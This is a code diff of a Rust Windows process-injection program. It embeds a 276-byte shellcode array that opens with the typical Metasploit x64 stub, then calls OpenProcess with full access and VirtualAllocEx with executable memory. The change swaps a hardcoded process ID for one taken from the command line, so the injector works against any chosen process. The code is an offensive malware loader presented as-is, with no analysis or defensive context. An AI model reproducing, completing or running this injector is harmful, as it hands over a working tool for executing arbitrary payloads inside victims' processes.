@@ -7,7 +7,12 @@ use winapi::ctypes::{c_void};
 use winapi::um::winnt::{PVOID};
 use winapi::um::handleapi::{CloseHandle};
 use winapi::um::synchapi::WaitForSingleObject;
+use std::env;
 fn main(){
+    let args_ :Vec<String>= env::args().collect();
+    if args_.len() != 2 {
+        println!("Usage: {} PID",args_[0]);
+    }
     unsafe {
     static SHELLCODE: [u8;276]  = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,
         0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
@@ -36,7 +41,7 @@ fn main(){
 
     let shellcode_ptr = &SHELLCODE as *const u8;
 
-        let pid = 1860;
+        let pid = args_[1].trim().parse::<u32>().expect("Enter a Valid Process ID");
         let handle = OpenProcess(0x0001FFFFF, 0, pid);
         let baseptr = VirtualAllocEx(handle, std::ptr::null_mut(), SHELLCODE.len(), 0x1000, 0x40);
 
